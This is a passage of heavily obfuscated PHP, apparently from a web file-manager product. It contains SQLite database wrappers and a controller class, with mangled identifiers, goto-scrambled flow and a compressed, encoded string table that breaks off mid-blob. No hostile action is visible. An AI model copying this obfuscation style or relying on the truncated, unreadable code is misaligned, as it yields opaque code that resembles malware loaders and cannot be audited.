$fî¢‹œ¦ó[389] => $FŞ¦í¥´àÇ[$fî¢‹œ¦ó[187]], $fî¢‹œ¦ó[1429] => $fî¢‹œ¦ó[33])); } goto B¾¤ËòÛì‹; a—Á³ÌÚêğ: } private function eventListParse($Fƒ¿¹ñÍ, $Cµ¬¥Æ÷ëŸ) { goto FÚ˜ÓÀ«¤ø; FÚ˜ÓÀ«¤ø: $dí©¯÷ê– =& $_SERVER[Å¸ş]; $cÀµ‡éö¼ = $Fƒ¿¹ñÍ[$dí©¯÷ê–[354]]; $fğ‚¦ˆÃ…ë = array_to_keyvalue($cÀµ‡éö¼, $dí©¯÷ê–[33], $dí©¯÷ê–[369]); goto c¢Ó¿”«‰“; c¢Ó¿”«‰“: $Aùíõåï¼ = array_to_keyvalue($cÀµ‡éö¼, $dí©¯÷ê–[33], $dí©¯÷ê–[2317]); foreach ($cÀµ‡éö¼ as $dÛ•ÚËæÇ­) { $E­¿ù³õÉ‹ = $dÛ•ÚËæÇ­[$dí©¯÷ê–[405]]; if ($dÛ•ÚËæÇ­[$dí©¯÷ê–[29]] == $dí©¯÷ê–[494] && isset($E­¿ù³õÉ‹[$dí©¯÷ê–[1005]])) { $fğ‚¦ˆÃ…ë[] = $E­¿ù³õÉ‹[$dí©¯÷ê–[1005]] . $dí©¯÷ê–[33]; $fğ‚¦ˆÃ…ë[] = $E­¿ù³õÉ‹[$dí©¯÷ê–[1006]] . $dí©¯÷ê–[33]; } if ($dÛ•ÚËæÇ­[$dí©¯÷ê–[29]] == $dí©¯÷ê–[2325] && isset($E­¿ù³õÉ‹[$dí©¯÷ê–[369]])) { $fğ‚¦ˆÃ…ë[] = $E­¿ù³õÉ‹[$dí©¯÷ê–[369]] . $dí©¯÷ê–[33]; } } $fğ‚¦ˆÃ…ë = array_merge($fğ‚¦ˆÃ…ë, $Aùíõåï¼, array($Cµ¬¥Æ÷ëŸ . $dí©¯÷ê–[33])); goto EîÛÌ£ÉÔ¯; a¬îÅÁß İ: $F› “Ÿ‘·— = Model($dí©¯÷ê–[755])->sourceListInfo($fğ‚¦ˆÃ…ë, !0); foreach ($cÀµ‡éö¼ as &$dÛ•ÚËæÇ­) { if ($dÛ•ÚËæÇ­[$dí©¯÷ê–[29]] == $dí©¯÷ê–[494] && isset($dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[1005]])) { $dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[1005]] = $F› “Ÿ‘·—[$dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[1005]]]; $dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[1006]] = $F› “Ÿ‘·—[$dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[1006]]]; } if ($dÛ•ÚËæÇ­[$dí©¯÷ê–[29]] == $dí©¯÷ê–[2325] && isset($dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[369]])) { $dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[369]] = $F› “Ÿ‘·—[$dÛ•ÚËæÇ­[$dí©¯÷ê–[405]][$dí©¯÷ê–[369]]]; } $dÛ•ÚËæÇ­[$dí©¯÷ê–[391]] = $F› “Ÿ‘·—[$dÛ•ÚËæÇ­[$dí©¯÷ê–[369]]]; $dÛ•ÚËæÇ­[$dí©¯÷ê–[2330]] = $F› “Ÿ‘·—[$dÛ•ÚËæÇ­[$dí©¯÷ê–[2317]]]; if ($dÛ•ÚËæÇ­[$dí©¯÷ê–[29]] == $dí©¯÷ê–[2074]) { $dÛ•ÚËæÇ­[$dí©¯÷ê–[2330]] = $dÛ•ÚËæÇ­[$dí©¯÷ê–[391]]; $dÛ•ÚËæÇ­[$dí©¯÷ê–[2317]] = $dÛ•ÚËæÇ­[$dí©¯÷ê–[2330]][$dí©¯÷ê–[369]]; $dÛ•ÚËæÇ­[$dí©¯÷ê–[391]] = !1; $dÛ•ÚËæÇ­[$dí©¯÷ê–[369]] = $dí©¯÷ê–[33]; } $dÛ•ÚËæÇ­[$dí©¯÷ê–[2261]] = $EŒŒÅÄÃæ[$dÛ•ÚËæÇ­[$dí©¯÷ê–[1436]]]; } unset($dÛ•ÚËæÇ­); goto FÅ²ÔÀèÁ»; EîÛÌ£ÉÔ¯: $fğ‚¦ˆÃ…ë = array_unique($fğ‚¦ˆÃ…ë); $d¨ô³¸¸Ëê = array_unique(array_to_keyvalue($cÀµ‡éö¼, $dí©¯÷ê–[33], $dí©¯÷ê–[1436])); $EŒŒÅÄÃæ = Model($dí©¯÷ê–[479])->userListInfo($d¨ô³¸¸Ëê); goto a¬îÅÁß İ; FÅ²ÔÀèÁ»: $Fƒ¿¹ñÍ[$dí©¯÷ê–[354]] = $cÀµ‡éö¼; return $Fƒ¿¹ñÍ; goto bø“˜”¹‘—; bø“˜”¹‘—: } public function removeBySource($AÔ¼Õ˜ŒÔƒ) { $a•‡áŸ†É = array($_SERVER[Å¸ş][383] => $AÔ¼Õ˜ŒÔƒ); $this->where($a•‡áŸ†É)->remove(); } } goto FŞïç¨‘ò¾; d³ßÜç„×é: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto EšìĞ‡ŞŞ÷; dñ¶×¼Õ¸ˆ: $this->in =& $in; $this->values[$F¦ªóÖôÙ[6]] =& $config; $this->values[$F¦ªóÖôÙ[7]] =& $in; goto eâ†‰õÊ‰‹; eâ†‰õÊ‰‹: $this->tpl = TEMPLATE . MOD . $F¦ªóÖôÙ[8]; $this->_classObjectID = mt_rand(0, 10000); goto Aó¨îŒæµ®; EšìĞ‡ŞŞ÷: $F¦ªóÖôÙ =& $_SERVER[Å¸ş]; global $in, $config; $this->config =& $config; goto dñ¶×¼Õ¸ˆ; Aó¨îŒæµ®: } public function loadClass($aº´İ¡Ö‚·) { if (1 === func_num_args()) { $this->{$aº´İ¡Ö‚·} = new $aº´İ¡Ö‚·(); } else { $B‡Š†ù³¸Å = new ReflectionClass($aº´İ¡Ö‚·); $fªÕôŸŒâ² = func_get_args(); array_shift($fªÕôŸŒâ²); $this->{$aº´İ¡Ö‚·} = $B‡Š†ù³¸Å->newInstanceArgs($fªÕôŸŒâ²); } return $this->{$aº´İ¡Ö‚·}; } protected function assign($D£âÜ÷œÚ, $BòÁŠß‰§) { $this->values[$D£âÜ÷œÚ] = $BòÁŠß‰§; } protected function display($d°ë†õõ¡Ø) { ob_end_clean(); extract($this->values); require $this->tpl . $d°ë†õõ¡Ø; } } class DbSqliteBase extends Db { public function __construct($Fñ¹°Òä¡ = '') { $c‘ğŞÕá™© =& $_SERVER[Å¸ş]; if (!extension_loaded($c‘ğŞÕá™©[9])) { think_exception(think_lang($c‘ğŞÕá™©[10]) . $c‘ğŞÕá™©[11]); } if (!empty($Fñ¹°Òä¡)) { if (!isset($Fñ¹°Òä¡[$c‘ğŞÕá™©[12]])) { $Fñ¹°Òä¡[$c‘ğŞÕá™©[12]] = 438; } $this->config = $Fñ¹°Òä¡; if (empty($this->config[$c‘ğŞÕá™©[13]])) { $this->config[$c‘ğŞÕá™©[13]] = array(); } } } public function connect($Bó²öÌƒ´Ó = '', $F«µ¹‰»…ƒ = 0) { $C„ã–±Ş‘¾ =& $_SERVER[Å¸ş]; if (!isset($this->linkID[$F«µ¹‰»…ƒ])) { goto C‹Šì¥Ø; aÓÊµø²«ã: $this->linkID[$F«µ¹‰»…ƒ] = $b‰µ”Ö”Šê($Bó²öÌƒ´Ó[$C„ã–±Ş‘¾[17]], $Bó²öÌƒ´Ó[$C„ã–±Ş‘¾[12]]); if (!$this->linkID[$F«µ¹‰»…ƒ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto bòèÖ¬¡çŞ; bòèÖ¬¡çŞ: @sqlite_busy_timeout($this->linkID[$F«µ¹‰»…ƒ], 30000); if (1 != think_config($C„ã–±Ş‘¾[18])) { unset($this->config); } goto Bè‡Ø Á’¸; C‹Šì¥Ø: if (empty($Bó²öÌƒ´Ó)) { $Bó²öÌƒ´Ó = $this->config; } $bÑó‚‹°Óã = !empty($Bó²öÌƒ´Ó[$C„ã–±Ş‘¾[13]][$C„ã–±Ş‘¾[14]]) ? $Bó²öÌƒ´Ó[$C„ã–±Ş‘¾[13]][$C„ã–±Ş‘¾[14]] : $this->pconnect; $b‰µ”Ö”Šê = $bÑó‚‹°Óã ? $C„ã–±Ş‘¾[15] : $C„ã–±Ş‘¾[16]; goto aÓÊµø²«ã; Bè‡Ø Á’¸: } return $this->linkID[$F«µ¹‰»…ƒ]; } public function free() { $this->queryID = null; } public function query($E½´©¿ƒ­) { goto dÁŞÑ„ñ³­; dÁŞÑ„ñ³­: $E˜ò¥‹É°© =& $_SERVER[Å¸ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B¤áóğ§æ‘; a¸­ÓóÜÜÚ: think_status($E˜ò¥‹É°©[20]); $this->queryID = sqlite_query($this->_linkID, $E½´©¿ƒ­); $this->debug(); goto F¡©ÄÚ†Í; F¡©ÄÚ†Í: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $b•°ŸÊ™Îè = $this->getAll(); return $b•°ŸÊ™Îè; } goto Cô•¢Ë¬‡Ó; B¤áóğ§æ‘: $this->queryStr = $E½´©¿ƒ­; if ($this->queryID) { $this->free(); } think_action_status($E˜ò¥‹É°©[19], 1); goto a¸­ÓóÜÜÚ; Cô•¢Ë¬‡Ó: } public function execute($CõôÔæÛ¶è) { goto EÍ…¦µØ³; EÍ…¦µØ³: $fƒàˆ–ŞõÛ =& $_SERVER[Å¸ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f†Ä„à£; AÊ„õ¿õ“†: think_status($fƒàˆ–ŞõÛ[20]); $f‰µ”ÂŠ = sqlite_exec($this->_linkID, $CõôÔæÛ¶è); $this->debug(); goto CĞŞ°˜ŸÎ•; CĞŞ°˜ŸÎ•: if (!1 === $f‰µ”ÂŠ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto AïÎ¿«Šµé; f†Ä„à£: $this->queryStr = $CõôÔæÛ¶è; if ($this->queryID) { $this->free(); } think_action_status($fƒàˆ–ŞõÛ[21], 1); goto AÊ„õ¿õ“†; AïÎ¿«Šµé: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Å¸ş][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÙ¡å·– = sqlite_query($this->_linkID, $_SERVER[Å¸ş][23]); if (!$BÙ¡å·–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¦ôÄ¶’ = sqlite_query($this->_linkID, $_SERVER[Å¸ş][24]); if (!$f¦ôÄ¶’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DÓ­¾åÍéÓ = array(); if ($this->numRows > 0) { for ($FÇ²‚±È°™ = 0; $FÇ²‚±È°™ < $this->numRows; $FÇ²‚±È°™++) { $DÓ­¾åÍéÓ[$FÇ²‚±È°™] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $DÓ­¾åÍéÓ; } public function getFields($Fõ¾±ˆ• Ò) { $B‚”“Éîá– =& $_SERVER[Å¸ş]; $e¡¾ˆçˆ„ = $this->query($B‚”“Éîá–[25] . $Fõ¾±ˆ• Ò . $B‚”“Éîá–[26]); $A±ßœ™ğèñ = array(); if ($e¡¾ˆçˆ„) { foreach ($e¡¾ˆçˆ„ as $CÉÑ·ˆëƒ => $D¡šøÅÛ¤‘) { $A±ßœ™ğèñ[$D¡šøÅÛ¤‘[$B‚”“Éîá–[27]]] = array($B‚”“Éîá–[28] => $D¡šøÅÛ¤‘[$B‚”“Éîá–[27]], $B‚”“Éîá–[29] => $D¡šøÅÛ¤‘[$B‚”“Éîá–[30]], $B‚”“Éîá–[31] => (bool) ($D¡šøÅÛ¤‘[$B‚”“Éîá–[32]] === $B‚”“Éîá–[33]), $B‚”“Éîá–[34] => $D¡šøÅÛ¤‘[$B‚”“Éîá–[35]], $B‚”“Éîá–[36] => strtolower($D¡šøÅÛ¤‘[$B‚”“Éîá–[37]]) == $B‚”“Éîá–[38], $B‚”“Éîá–[39] => strtolower($D¡šøÅÛ¤‘[$B‚”“Éîá–[40]]) == $B‚”“Éîá–[41]); } } return $A±ßœ™ğèñ; } public function getTables($E“ÑÂ«˜Ÿ = '') { $eƒˆ—…Ì…¨ =& $_SERVER[Å¸ş]; $Eô‘˜õ‚é¢ = $this->query($eƒˆ—…Ì…¨[42] . $eƒˆ—…Ì…¨[43] . $eƒˆ—…Ì…¨[44]); $B‘‘²Ïì±Õ = array(); foreach ($Eô‘˜õ‚é¢ as $B†‹Ù¼Ùèƒ => $cª¹ÖÇ§º×) { $B‘‘²Ïì±Õ[$B†‹Ù¼Ùèƒ] = current($cª¹ÖÇ§º×); } return $B‘‘²Ïì±Õ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eéùÜÔèšË =& $_SERVER[Å¸ş]; $DËø„Î¢¦ = sqlite_last_error($this->_linkID); $this->error = $DËø„Î¢¦ . $eéùÜÔèšË[4] . sqlite_error_string($DËø„Î¢¦); if ($eéùÜÔèšË[33] != $this->queryStr) { $this->error .= LNG($eéùÜÔèšË[45]) . $this->queryStr; } think_trace($this->error, $eéùÜÔèšË[33], $eéùÜÔèšË[46]); return $this->error; } public function escapeString($dµÒè…Íí) { return sqlite_escape_string($dµÒè…Íí); } public function parseLimit($b£²êà‘‹î) { $D×›ê‚Ò¡ˆ =& $_SERVER[Å¸ş]; $aôÚÊßíñø = $D×›ê‚Ò¡ˆ[33]; if (!empty($b£²êà‘‹î)) { $b£²êà‘‹î = explode($D×›ê‚Ò¡ˆ[47], $b£²êà‘‹î); if (count($b£²êà‘‹î) > 1) { $aôÚÊßíñø .= $D×›ê‚Ò¡ˆ[48] . $b£²êà‘‹î[1] . $D×›ê‚Ò¡ˆ[49] . $b£²êà‘‹î[0] . $D×›ê‚Ò¡ˆ[50]; } else { $aôÚÊßíñø .= $D×›ê‚Ò¡ˆ[48] . $b£²êà‘‹î[0] . $D×›ê‚Ò¡ˆ[50]; } } return $aôÚÊßíñø; } } class DbSqlite3Base extends Db { public function __construct($FÙ„¢ÁÃ“ = '') { $CÎÜÏâçò =& $_SERVER[Å¸ş]; if (!class_exists($CÎÜÏâçò[51])) { think_exception(think_lang($CÎÜÏâçò[10]) . $CÎÜÏâçò[52]); } if (!empty($FÙ„¢ÁÃ“)) { if (!isset($FÙ„¢ÁÃ“[$CÎÜÏâçò[12]])) { $FÙ„¢ÁÃ“[$CÎÜÏâçò[12]] = 438; } $this->config = $FÙ„¢ÁÃ“; if (empty($this->config[$CÎÜÏâçò[13]])) { $this->config[$CÎÜÏâçò[13]] = array(); } } } public function connect($a¨î—‰‘ª = '', $BˆöáÎæ…³ = 0) { $CéÔ…™æÎ =& $_SERVER[Å¸ş]; if (!isset($this->linkID[$BˆöáÎæ…³])) { if (empty($a¨î—‰‘ª)) { $a¨î—‰‘ª = $this->config; } $this->linkID[$BˆöáÎæ…³] = new SQLite3($a¨î—‰‘ª[$CéÔ…™æÎ[17]]); if (!$this->linkID[$BˆöáÎæ…³]) { think_exception($this->linkID[$BˆöáÎæ…³]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$BˆöáÎæ…³]->busyTimeout(30000); if (1 != think_config($CéÔ…™æÎ[18])) { unset($this->config); } } return $this->linkID[$BˆöáÎæ…³]; } public function free() { $this->queryID = null; } public function query($FÎÕôÇËºƒ) { goto BÛ‚×Í¶Ö‡; D¸ëÈáã’: $this->queryStr = $FÎÕôÇËºƒ; if ($this->queryID) { $this->free(); } think_action_status($aîºšà„¹ù[19], 1); goto DÕÇì˜¦§; BÛ‚×Í¶Ö‡: $aîºšà„¹ù =& $_SERVER[Å¸ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D¸ëÈáã’; DÕÇì˜¦§: think_status($aîºšà„¹ù[20]); $this->queryID = $this->_linkID->query($FÎÕôÇËºƒ); $this->debug(); goto c‚¡…Áêã; c‚¡…Áêã: if (!1 === $this->queryID) { $this->error(); return !1; } else { $fğå¾Ó¦» = $this->getAll(); $this->numRows = count($fğå¾Ó¦»); return $fğå¾Ó¦»; } goto A”Ûğ‰¾È•; A”Ûğ‰¾È•: } public function execute($aŠ‰ôŠØöÚ) { goto Dø¹£çáÀœ; Dø¹£çáÀœ: $ağÄÂ‹ÖÀ  =& $_SERVER[Å¸ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÑğÌ¨„ù•; CÑğÌ¨„ù•: $this->queryStr = $aŠ‰ôŠØöÚ; if ($this->queryID) { $this->free(); } think_action_status($ağÄÂ‹ÖÀ [21], 1); goto DÉ£º³­¸œ; CÂºÇáí˜ƒ: if (!1 === $F¬š¥º›) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Bñ¾­§–ØÓ; DÉ£º³­¸œ: think_status($ağÄÂ‹ÖÀ [20]); $F¬š¥º› = $this->_linkID->exec($aŠ‰ôŠØöÚ); $this->debug(); goto CÂºÇáí˜ƒ; Bñ¾­§–ØÓ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Å¸ş][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D‹İĞ…Ã = $this->_linkID->query($_SERVER[Å¸ş][23]); if (!$D‹İĞ…Ã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bƒå×òƒÓš = $this->_linkID->query($_SERVER[Å¸ş][24]); if (!$Bƒå×òƒÓš) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fŸÎŒó´³´ = array(); while ($fóè¿Öâ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fŸÎŒó´³´[] = $fóè¿Öâ; } $this->queryID->reset(); return $fŸÎŒó´³´; } public function getFields($e“ŞÎÉ¾Á¸) { $A‚öøŠƒó =& $_SERVER[Å¸ş]; $dåãì•ÆÌ = $this->query($A‚öøŠƒó[25] . $e“ŞÎÉ¾Á¸ . $A‚öøŠƒó[26]); $CÇ¥ßä†› = array(); if ($dåãì•ÆÌ) { foreach ($dåãì•ÆÌ as $BÚ¤®Ü‹ => $FœÛ·Ó‹‰‹) { $CÇ¥ßä†›[$FœÛ·Ó‹‰‹[$A‚öøŠƒó[28]]] = array($A‚öøŠƒó[28] => $FœÛ·Ó‹‰‹[$A‚öøŠƒó[28]], $A‚öøŠƒó[29] => $FœÛ·Ó‹‰‹[$A‚öøŠƒó[29]], $A‚öøŠƒó[31] => (bool) ($FœÛ·Ó‹‰‹[$A‚öøŠƒó[31]] === $A‚öøŠƒó[33]), $A‚öøŠƒó[34] => $FœÛ·Ó‹‰‹[$A‚öøŠƒó[53]], $A‚öøŠƒó[36] => (bool) $FœÛ·Ó‹‰‹[$A‚öøŠƒó[54]], $A‚öøŠƒó[39] => (bool) $FœÛ·Ó‹‰‹[$A‚öøŠƒó[54]]); } } return $CÇ¥ßä†›; } public function getTables($e ²Êñ¿åÉ = '') { $fïÄ„óÖÊÂ =& $_SERVER[Å¸ş]; $CÒõ›ß¢Àİ = $this->query($fïÄ„óÖÊÂ[42] . $fïÄ„óÖÊÂ[43] . $fïÄ„óÖÊÂ[44]); $e×íÁ‰ºÇÆ = array(); foreach ($CÒõ›ß¢Àİ as $DÓÀÊğ¸Ç‰ => $F“ÊïğÁùç) { $e×íÁ‰ºÇÆ[$DÓÀÊğ¸Ç‰] = current($F“ÊïğÁùç); } return $e×íÁ‰ºÇÆ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eìä˜¢Úéò =& $_SERVER[Å¸ş]; $this->error = $this->_linkID->lastErrorMsg(); if ($eìä˜¢Úéò[33] != $this->queryStr) { $this->error .= LNG($eìä˜¢Úéò[45]) . $this->queryStr; } think_trace($this->error, $eìä˜¢Úéò[33], $eìä˜¢Úéò[46]); return $this->error; } public function escapeString($EŸÔøÅñèĞ) { $c»„Ú£Ê¤‰ =& $_SERVER[Å¸ş]; if ($this->_linkID) { return $this->_linkID->escapeString($EŸÔøÅñèĞ); } return str_ireplace($c»„Ú£Ê¤‰[55], $c»„Ú£Ê¤‰[56], $EŸÔøÅñèĞ); } public function parseLimit($dˆÑé‚·±) { $Fë ›Æˆì =& $_SERVER[Å¸ş]; $Bù‘ª†¿¸á = $Fë ›Æˆì[33]; if (!empty($dˆÑé‚·±)) { $dˆÑé‚·± = explode($Fë ›Æˆì[47], $dˆÑé‚·±); if (count($dˆÑé‚·±) > 1) { $Bù‘ª†¿¸á .= $Fë ›Æˆì[48] . $dˆÑé‚·±[1] . $Fë ›Æˆì[49] . $dˆÑé‚·±[0] . $Fë ›Æˆì[50]; } else { $Bù‘ª†¿¸á .= $Fë ›Æˆì[48] . $dˆÑé‚·±[0] . $Fë ›Æˆì[50]; } } return $Bù‘ª†¿¸á; } } goto cŸ™Ï»†¡Š; DåÁ²¿êá‡: if (!function_exists('_kodDe')) { function _kodDe($E·· ¹…Å) { $E·· ¹…Å = base64_decode($E·· ¹…Å); $DõªÙ‰ÅÀµ = strlen($E·· ¹…Å); $e–ƒèß¸Ãò = ''; $fˆ£Ş…÷à¼ = ord($E·· ¹…Å[0]) - 30; for ($eÃ¯ç·µñ = 1; $eÃ¯ç·µñ < $DõªÙ‰ÅÀµ; $eÃ¯ç·µñ += 2) { if ($eÃ¯ç·µñ + 1 < $DõªÙ‰ÅÀµ) { $e–ƒèß¸Ãò .= chr(ord($E·· ¹…Å[$eÃ¯ç·µñ + 1]) + $fˆ£Ş…÷à¼); $e–ƒèß¸Ãò .= chr(ord($E·· ¹…Å[$eÃ¯ç·µñ]) + $fˆ£Ş…÷à¼); } else { $e–ƒèß¸Ãò .= chr(ord($E·· ¹…Å[$eÃ¯ç·µñ]) + $fˆ£Ş…÷à¼); } } return $e–ƒèß¸Ãò; } } define(base64_decode('xbj+'), "\322"); $_SERVER[Å¸ş] = explode("\x7c\x2\x7c\x2\x7c\x5", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x7\x60\x5b\xc5\xf9\x38\xb3\x65\xef\xd5\x7f\x19\xf\x93\xc4\x23\x1a\x1e\x89\x93\x38\x1e\x91\x6d\x39\x16\xb1\x2d\x45\x92\xb3\x2c\x47\x3c\x49\x4f\xd2\xb3\x25\x3d\xf9\xbd\x27\xaf\x38\x2d".strrev('}oVÛwß}İßwİñ»İßwİÑÖè\'½ßoşfZĞ(B2…e³(aXV«,Ê²„³„')."\x7b\xdd\x63\x5b\x27\x76\x3\xff\xdb\xf3\x3e\xfc\x33\xb1\xeb\xc4\xee\x13\x7b\xe0\xf0\x71\x6b\xf6\xda\x5\xfd\xb7\x7b\x76\x61\xbf\xff\xd1\xea\xc3\xce\x7d\xa1\xfc\x97\x7b\xfa\x9b\x7f\xd6\x39\x51\xfe\x93\x3d\x94\x8e\x9f\xd\xad\xd9\x3d"."\172\351\213\313\227\264\175\220\175\335\165\310\143\347\217\350\373\136\166\332\372\53\214\115\127\376\147\310\365\227\350\307\267\175\61\353\37\25\236\103\17\117\57\32\350\216\174\372\360\372\67\166\277\351\130\317\372\207"."\377\66\160\353\176\237\54\135\143\14\336\177\367\235\123\356\356\176\163\367\246\165\7\135\272\342\255\306\133\126\374\344\314\145\247\176\370\255\126\370\374\200\313\333\346\137\274\145\144\217\225\253\236\76\365\303\252\23"."\xe4\x23\xff\xab\x1f\xff\xf0\x7f\x8e\x9e\x75\xd2\xbb\x87\x46\x57\xbd\xb2\xdf\xb0\xd4\x39\xb2\xd7\x1\xbf\x7d\xa8\x79\xe1\xfa\xe3\x7f\xbf\xce\x93\xdd\xf5\x96\x83\x46\x4e\xe\x5c\x33\xe5\xbb\xda\xe7\xff\xf8\xc0\xf9\x4f\x2a\x53\x66\x7c"."\162\360\63\323\324\107\226\337\141\76\375\133\365\371\47\376\65\145\174\375\355\255\77\135\272\164\317\263\336\252\171\370\35\151\301\225\257\145\56\360\167\76\64\265\255\376\304\346\316\306\127\247\26\122\157\274\27\310"."\xa7\x2e\x3e\xeb\x8b\xa7\x57\x85\xca\x9e\x6f\x78\xfc\xaa\xf6\xa3\x13\x7b\xbc\x72\xca\xdb\xbb\xbe\xfb\xd1\x17\x7b\xdc\xb3\xc7\x39\xb7\x5d\x7c\xc6\x4b\x9f\x8d\x3f\xb0\xcf\x8d\x17\x3e\x33\xed\x8b\xdb\xee\xbd\xeb\xdd\x77\x5e\xfa\x57\xec"."\5\155\105\355\147\273\257\77\102\175\156\347\361\57\17\355\173\273\347\152\171\352\254\115\133\76\235\372\107\371\216\165\33\77\270\340\367\47\325\127\34\176\345\21\173\156\161\106\232\134\233\247\174\273\347\211\257\157"."\373\344\211\335\166\331\5\367\157\3\376\221\162\232\51\51\243\252\141\32\30\20\327\162\111\65\205\303\152\16\377\272\361\217\61\224\121\115\5\207\243\75\376\160\64\324\33\10\170\203\341\50\51\121\114\317\152\11".base64_decode('EsrLupwlhecV3QCfEouL5rW8krNAOCAhm3JMNkhJ7a3Rdm+gy780Gl4a8BKMWHSooOhjOIaCIVPWzQ==').base64_decode('sJpVGMaIzurV6p3v65HCQU9PyNMW9vl7MLjN393tCxfDg/6urlZP24LilEDQM7/bI4H6ZZSomktqFQ==')."\xd2\x49\x38\xe5\x24\xa9\x12\x7\x3a\x54\x25\x93\xc0\xc1\x9c\x4c\xab\x63\x8e\xe5\x49\x28\xcc\x42\x60\xc\x72\x85\x4c\x6\x47\x7a\x58\x88\xd4\x5f\x49\xca\x85\xc\xe9\xb3\x76\x31\x92\xd7\xd5\xac\x4c\x9b\xbe\x40\x19\x63\x50\x1c\x90\xb"."\246\246\346\342\70\342\35\65\165\231\303\101\215\343\272\222\125\162\244\250\220\267\313\333\26\226\140\65\245\216\240\277\133\42\103\221\225\15\123\321\245\305\235\336\240\127\202\125\157\52\107\55\56\227\160\276\336\36"."\xd0\x21\x92\xa7\xab\x4b\x9a\xac\x4\x53\xc9\xe6\x69\x31\x38\x4f\x89\xc2\xfc\xc1\x76\x6f\x50\x6a\x5d\x2a\xf1\x7e\x8a\x6b\xd9\xac\x96\x73\x81\x52\xc0\x78\x9a\x42\x55\xbd\xc1\x20\xe\x38\x8\x5\x77\xf9\xe0\xd0\x91\x88\xbf\xa3\x23\xe4"."\x65\x31\xd2\xb8\x85\x5d\xa0\x26\x75\x84\x4a\x2d\xb1\x44\x32\x63\x46\x87\xe5\x4c\x81\x12\xeb\x20\xfe\x2d\x27\x3f\xe4\x57\x33\x8\x1\xf\xa9\x39\xb5\x40\x88\x95\x14\xa1\x69\x6c\xe6\x90\x40\x81\x62\x2b\x14\x92\x5\xd9\x34\x32\xa7\xc0"."\x4\x1b\xc6\xc1\xa6\x66\xfc\x3b\x97\x20\xc5\xa2\x30\x4d\xd1\xcd\xa8\x92\x8b\x6b\x9\x35\x47\xa6\x61\xb\x99\x72\x84\xf0\x64\x33\xdd\xae\xab\x0\x8f\x14\xa8\xb9\xe2\x5a\x7e\xac\x5b\x1b\x26\x6d\x48\xaa\x19\xa5\x8b\xcd\xb2\xa4\x96\x49"."\50\72\217\347\101\166\61\205\64\106\35\27\162\367\24\262\42\12\213\306\323\152\46\241\323\311\371\175\230\65\244\130\305\64\101\63\14\132\323\336\174\106\223\23\41\105\27\152\337\1\212\361\27\114\21\130\100\150"."\x1d\x9a\x9e\x6d\x7\xc\x80\xf4\xe\x20\x7b\xb5\xb7\x44\xc2\x20\x25\xfc\x84\xd0\x29\x2e\xfc\xe3\xae\xe8\x3b\xc5\xf9\x5d\x7f\xdf\x3c\xf0\x4f\x25\xe1\x62\x11\x52\xb5\xb4\x92\xc9\x44\x95\x51\x85\x4c\x90\x6c\x62\xa6\x41\x6b\xef\x36\x62"."\x6a\xce\xd\x20\x38\xea\xf3\x47\xd3\xb2\x91\xee\x4e\xcc\x8c\xa2\x5c\xa4\xe6\xb9\x84\x32\xea\xca\xa7\xf3\x38\xca\x27\x70\xc4\x42\xc0\xb0\xbf\x7b\x34\xd3\x2b\xb0\xd8\x8c\x16\x97\x33\x62\x4b\x71\x38\x6d\x9a\xf9\x90\x92\x4b\xc0\xe\x21"."\x2d\xd2\x46\x72\xa8\xc3\xf2\x8a\x42\x90\xda\x1d\x52\x42\xea\x96\x96\x4a\x9d\xd\x6a\x3\xa5\x2e\x40\x2b\xc9\x31\xce\xf1\xd2\x66\x36\xc3\x42\xb4\xb5\xc\x66\x30\xa0\x39\x4a\x68\xa2\x8c\xc4\x95\x51\x93\x74\x92\x34\x37\x9e\x96\x75\x30".strrev('¼„½;¢¤Œç.°Î¾˜&rÓiìè¹Â®